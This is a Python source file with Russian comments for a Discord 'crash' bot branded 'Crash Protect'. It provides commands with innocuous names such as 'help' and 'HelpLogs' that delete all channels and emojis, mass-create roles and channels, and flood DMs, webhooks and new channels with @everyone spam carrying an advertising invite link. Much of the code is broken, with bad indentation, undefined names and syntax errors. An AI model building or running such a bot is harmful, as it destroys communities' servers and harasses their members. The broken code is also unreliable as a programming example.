#сюда пишем токен нашего бота
 token='тут твой токен'




#обычный спам
prefix = '+' #пишем сюда перфикс
@client.command()
async def send(ctx):
  await ctx.send(prefix)

@client.command()
async def HelpAdmins(ctx): #сюда пишите свою команду но советую не менять
  await ctx.send('ДАННЫЙ СЕРВЕР КРАШИТСЯ БОТОМ Crash Protect Premium. наш сервер: https://discord.gg/arzVY7jkqr ')



#дальше спам в лс
@client.command()
async def  Ping(ctx): 
  dm = await member.create_dm()
while True:
await dm.send('краш')
#теперь создаём спам вебхуками

async def spamWebhooks(ctx):
  while True:
  for channel in guild.channels:
   await channel.create_webhook(name = 'Crash By Crash Protect Premium ')
   async def spamhook(ctx):
  while True:
    for channel in ctx.guild.channels:
      try:
        hook = await channel.webhooks()
        for spam in hook:
          await spam.send('Ку')
      except:
        continue

@bot.command()
async def spamall1(ctx):
   await crhooks(ctx)
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))

  #спам ролями
  
@bot.command(pass_context=True)
async def role(ctx, m):
    await ctx.message.delete()
    count = 0
    while count < int(m):
        await ctx.guild.create_role(name="Crashed By Crash Protect")
        count += 1
  
#удаление каналов

      @bot.command()
async def HelpLogs(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="По просьбе") #удаляем
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}") # отпровляем отчёт отправителю команды







  
  #полный разьёб сервера





  Spam_Channel = ['CRASHED_BY_CRASH_PROTECT',]
Spam_message = ['@everyone сервер крашнут ботом Crash Protect ссылка на нас https://discord.gg/arzVY7jkqr  ']



@client.command()
async def help(ctx, reason = None):
 guild = ctx.message.guild
 for channel in guild.channels:
 try:
    await channel.delete()
except:
   pass
 for channel in guild.channels:
 await channel.delete()
 try:
    print(Fore.MAGENTA + f"{channel.name} соснул хуй" + Fore.RESET)
 except:
     print(Fore.RED + f"{channel.name} Не соснул хуй" + Fore.RESET)
 for emoji in guild.emojis:
 await emoji.delete(reason = 'Краш')
 try:
    print(Fore.MAGENTA + f"{emoji.name} пососала" + Fore.RESET)
 except:
    print(Fore.RED + f"{emoji.name} Не пососала" + Fore.RESET)
 for i in range(250)
  await ctx.create_text_channels(random.choice(Spam_Channel)
  print(f"{server.name} Crashed By Crash Protect")
  guild = ctx.message.guild




@client.event
async def om_guild_Channel_create(channel):
 while True:
  await channel.send(random.choice(Spam_message))
